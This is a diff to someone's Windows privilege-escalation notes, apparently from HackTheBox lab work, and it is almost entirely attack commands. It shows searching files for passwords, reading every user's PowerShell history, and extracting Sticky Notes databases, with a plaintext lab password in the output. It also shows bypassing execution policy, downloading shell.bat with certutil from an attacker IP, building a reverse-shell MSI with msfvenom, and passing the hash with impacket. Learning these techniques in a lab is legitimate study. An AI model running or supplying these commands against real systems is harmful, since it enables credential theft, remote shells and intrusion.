@@ -1,3 +1,5 @@
+
+Beautiful [cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/).
 ## Starting
 
 Check network information
@@ -449,4 +451,75 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 [*] Cleaning up...
 ```
 
-## UAC : User account control
+
+Some enumerations 
+
+```cmd-session
+netstat -ano | findstr 6064
+```
+```powershell-session
+get-process -Id 3324
+```
+
+## Credential hunting
+using findstr function
+```powershell-session
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+```
+
+Reading powershell history file 
+```powershell-session
+gc (Get-PSReadLineOption).HistorySavePath
+```
+or we can use this command
+```powershell-session
+foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
+```
+Get info from sticky notes 
+```powershell-session
+Set-ExecutionPolicy Bypass -Scope Process
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+you to the security risks described in the about_Execution_Policies help topic at
+https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
+
+PS C:\htb> cd .\PSSQLite\
+PS C:\htb> Import-Module .\PSSQLite.psd1
+PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
+PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
+ 
+Text
+----
+\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
+\id=e4adae4c-a40b-48b4-93a5-900247852f96
+\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
+\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am
+```
+
+
+## Living of land
+
+https://lolbas-project.github.io/
+
+#### Transferring File with Certutil
+
+```powershell-session
+certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
+```
+
+A binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.
+
+
+Strong shell with Admin, i don't get it, but it's worth looking at it 
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp lhost=yourip lport=9443 -f msi -o aie.msi
+```
+then run a nc listener
+
+pass the hash with impacket 
+```bash
+wmiexec.py 'Administrator@10.129.43.33' -hashes aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54
+```
